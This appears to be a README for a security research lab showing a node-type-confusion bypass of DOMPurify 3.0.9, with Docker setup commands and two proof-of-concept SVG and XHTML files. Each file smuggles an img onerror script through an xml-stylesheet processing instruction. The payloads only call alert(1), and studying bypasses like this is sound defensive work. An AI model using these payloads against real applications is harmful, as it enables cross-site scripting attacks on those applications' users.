# Dompurify 3.0.9 bypass - Node type confusion

Link to the full article (in french) : https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion

## Installation

```
docker build -t dompurify-3.0.9-bypass .
docker run -p 3000:3000 dompurify-3.0.9-bypass
```

![image](https://github.com/Sharpforce/cybersecurity-code/assets/6013418/75be9d65-91ce-4fc4-b561-9c6be3699627)

## Description

The application allows uploading files in HTML, SVG, or XHTML format, but accessing these files, although possible, is restricted by a CSP policy. However, including such a file, sanitized by Dompurify, within the main page, enables bypass exploitation and execution of JavaScript code.

## Exploitation

### HTML file

The vulnerability is exploitable only when the node is of XML type. Including an HTML file confirms the proper sanitization by Dompurify when the node is of HTML type.

### SVG file

The following SVG file allows bypass exploitation:
```
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <rect width="50" height="50" fill="green" />
  <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
</svg>
```

### XHTML file

The following XHTML file allows bypass exploitation:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Exemple de document XHTML</title>
</head>
<body>
    <h1>Document XHTML</h1>
    <p>Exploitation de Dompurify 3.0.9.</p>
    <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
</body>
</html>
```
